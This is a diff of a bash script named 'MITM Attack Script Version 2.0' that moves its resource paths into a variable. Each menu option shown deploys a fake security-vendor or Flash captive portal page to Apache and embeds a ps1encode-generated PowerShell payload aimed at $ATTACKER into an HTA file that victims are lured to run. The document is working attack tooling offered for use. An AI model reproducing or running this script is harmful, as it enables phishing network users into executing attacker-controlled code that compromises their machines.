@@ -1,6 +1,7 @@
 #! /bin/bash
 
 ScriptName="MITM Attack Script Version 2.0"
+scriptloc=/toolslinux/exploits/mitm-captiveportal
 fdate=`date +%m.%d.%y-%k.%M`
 #DEFINED COLOR SETTINGS
 RED=$(tput setaf 1 && tput bold)
@@ -209,50 +210,50 @@ echo ""
 echo $BLUE"Select Menu Option:"
 read menuoption
 if [ $menuoption -eq 1 ]; then
-tar -xf ~/temp/ploys/HTA/cisco.tar -C /var/www
+tar -xf $scriptloc/ploys/HTA/cisco.tar -C /var/www
 service apache2 start
 ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
 sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
 else
 if [ $menuoption -eq 2 ]; then
-tar -xf ~/temp/ploys/HTA/MSForefront.tar -C /var/www
+tar -xf $scriptloc/ploys/HTA/MSForefront.tar -C /var/www
 service apache2 start
 ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
 sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
 else
 if [ $menuoption -eq 3 ]; then
-tar -xf ~/temp/ploys/HTA/Sophos.tar -C /var/www
+tar -xf $scriptloc/ploys/HTA/Sophos.tar -C /var/www
 service apache2 start
 ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
 sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
 else
 if [ $menuoption -eq 4 ]; then
-tar -xf ~/temp/ploys/HTA/squid.tar -C /var/www
+tar -xf $scriptloc/ploys/HTA/squid.tar -C /var/www
 service apache2 start
 ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
 sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
 else
 if [ $menuoption -eq 5 ]; then
-tar -xf ~/temp/ploys/HTA/trendmicro.tar -C /var/www
+tar -xf $scriptloc/ploys/HTA/trendmicro.tar -C /var/www
 service apache2 start
 ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
 sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
 else
 if [ $menuoption -eq 6 ]; then
-tar -xf ~/temp/ploys/HTA/Fortinet.tar -C /var/www
+tar -xf $scriptloc/ploys/HTA/Fortinet.tar -C /var/www
 service apache2 start
 ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
 sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
 else
 if [ $menuoption -eq 7 ]; then
-tar -xf ~/temp/ploys/HTA/flash.tar -C /var/www
+tar -xf $scriptloc/ploys/HTA/flash.tar -C /var/www
 service apache2 start
 ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
 #sed -n "/<script/,/<\/script>/p" /var/www/exploit.hta > /var/www/reverse_code.hta
 sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/install_flash_player.hta
 else
 if [ $menuoption -eq 8 ]; then
-tar -xf ~/temp/ploys/HTA/Fortinet-Old-Style.tar -C /var/www
+tar -xf $scriptloc/ploys/HTA/Fortinet-Old-Style.tar -C /var/www
 service apache2 start
 ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
 sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
